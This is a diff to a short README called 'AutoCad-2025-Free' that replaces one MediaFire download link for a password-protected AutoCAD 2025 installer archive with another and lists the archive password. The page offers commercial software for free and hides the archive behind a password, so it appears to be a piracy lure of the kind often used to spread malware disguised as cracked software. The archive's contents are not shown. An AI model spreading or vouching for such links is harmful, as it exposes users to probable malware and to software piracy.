@@ -1,6 +1,6 @@
 # AutoCad-2025-Free
 
-[Click here to Download](https://www.mediafire.com/file/t1jxiyuisey6i6o/AutoCAD_2025_Win64_install.rar/file)
+[Click here to Download](https://www.mediafire.com/file/amkdnk11u7ukt1c/AutoCAD_2025_Win64_install.rar/file)
 
 [Pass : S0f4fr33!]
 
